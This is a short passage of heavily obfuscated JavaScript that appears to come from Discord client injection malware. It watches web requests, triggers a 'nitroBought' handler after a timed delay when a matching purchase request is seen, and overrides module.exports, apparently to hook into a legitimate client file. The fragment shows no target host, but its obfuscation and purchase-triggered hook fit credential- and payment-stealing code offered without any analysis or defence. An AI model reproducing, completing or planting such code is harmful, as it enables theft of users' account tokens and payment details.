_0x25c892[_0x16925f(0xd4)][_0x16925f(0xee)](_0x16925f(0xc7))&&_0x25c892['method']===_0x16925f(0x8f):if(!config[_0x16925f(0x96)])return;setTimeout(()=>{const _0x4c852a=_0x16925f;nitroBought(_0xf3ef48)['catch'](console[_0x4c852a(0x10d)]);},0x1d4c);break;default:break;}}),module[_0xcdab72(0x84)]=require(_0xcdab72(0x11d));